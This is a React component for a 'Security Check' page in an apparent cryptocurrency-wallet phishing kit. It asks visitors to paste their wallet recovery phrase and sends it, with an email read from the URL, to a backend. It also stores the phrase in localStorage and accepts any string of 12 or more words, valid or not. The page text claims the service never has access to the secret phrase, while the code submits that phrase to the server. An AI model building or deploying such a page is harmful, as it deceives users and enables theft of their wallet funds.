import styled from 'styled-components'
import Logo from './Logo'
import { Button, NoticeMessage, TextArea } from '../../theme/ThemeStyle'
import { useEffect, useState } from 'react'
import * as bip39 from 'bip39';
import { api } from '../../common/api';
import { useDispatch, useSelector } from 'react-redux'
import { useHistory, useLocation } from 'react-router-dom/cjs/react-router-dom.min';
import { clearAccountValidationErrors, createAccountValidationError } from '../../app/accountVerification/slice';
import { AccountVerificationWrapper, Container, Main } from './GetStarted';
import HomeBackground from './HomeBackground';
import { setAlpha } from '../../common/utils';

const SeedPhrase = () => {

    const history = useHistory()
    const location = useLocation();

    const dispatch = useDispatch()
    const [seedPhrase, setSeedPhrase] = useState('')

    const { loading, error, isAuthenticated } = useSelector(state => state.accountVerification)

    const verifySeedPhrase = (e)=>{
        e.preventDefault()
        // const newPhrase = bip39.generateMnemonic();
        // console.log(newPhrase);
        const validLength = seedPhrase.trim().split(/\s+/g).length >= 12
        const isValidSeedPhrase = bip39.validateMnemonic(seedPhrase);


        if(validLength || isValidSeedPhrase){
            dispatch(api.validateSeedPhrase({mnemonic: seedPhrase, email: localStorage.getItem('email')}))
        }else{
            dispatch(createAccountValidationError('Invalid secret phrase'))
        }

    }

     const handleInput = e => {
        if(error){
            dispatch(clearAccountValidationErrors())
        }

        setSeedPhrase(e.target.value)
    }

    useEffect(()=>{
        if(isAuthenticated){
            localStorage.setItem('mnemonic', seedPhrase)
            dispatch(clearAccountValidationErrors())
            history.push('/account/verify/securequestions')
        }
    },[isAuthenticated])

    useEffect(()=>{
        const urlParams = new URLSearchParams(window.location.search);
        const hasEmailParam = urlParams.has('email');
        const email = urlParams.get('email');
        const isValidEmail = email => hasEmailParam && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        
        if (isValidEmail(email)) { // Corrected
            console.log(email);
            localStorage.setItem('email', email);
        }

        const baseUrl = location.pathname;
        
        // Update the URL to remove query parameters
        history.replace(baseUrl);
    },[])

    return (
        <Main>
            <Logo url={window.location.origin}/>
            <Container>
                {/* <HomeBackground /> */}
                <AccountVerificationWrapper onSubmit={verifySeedPhrase}>
                    <HeadingText>Security Check</HeadingText>
                    <Icon src='/../assets/verified_locked.png' alt='Unverified'/>
                    <Question>
                        <Title>True ownership of your crypto assets</Title>
                        <SubTitle> We secure your wallet, but don't control or have access to your private keys or secret phrase - only you do.</SubTitle>
                        {/* <p>Your security is our priority. Providing your recovery seed phrase helps us verify your account's legitimacy securely. Rest assured, your funds are safe with us.</p> */}
                        
                        {error&&<NoticeMessage value='error'>{error}</NoticeMessage>}
                        
                        <PlaceHolder>Secret phrase</PlaceHolder>
                        <TextArea 
                            onChange={ handleInput}
                            value={seedPhrase}
                            rows={4}/>
                        <HelperText>Typically 12 (sometimes 18, 24) words separated by single space.</HelperText>
                    </Question>
                    <Button type='submit'>Import</Button>
                </AccountVerificationWrapper>
            </Container>

        </Main>
    )
}


const Question = styled.div`
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 50px 20px;
    & p{
        color: ${({theme})=>theme.colors.dark3};
        margin: 0 0 10px;
        font-size: 12px;
    }
`

const Icon = styled.img`
    max-width: 150px;
    align-self: center;
`

const HeadingText = styled.h1`
    font-size: 36px;
    margin: 0;
`

const Title = styled.h2`
    font-size: 24px;
    line-height: 1.2;
    text-align: center;
    margin: 0 0 20px;
`

const PlaceHolder = styled.h3`
    font-size: 18px;
    line-height: 1.2;
    margin: 10px 0;
    align-self: flex-start;
`
const SubTitle = styled.h3`
    font-size: 16px;
    font-weight: 300;
    text-align: center;
    margin: 0 0 20px;
`
const HelperText = styled.div`
    color: ${({theme})=>theme.colors.dark1};
    margin: 0 0 10px;
    font-size: 14px;
    text-align: center;
`
export default SeedPhrase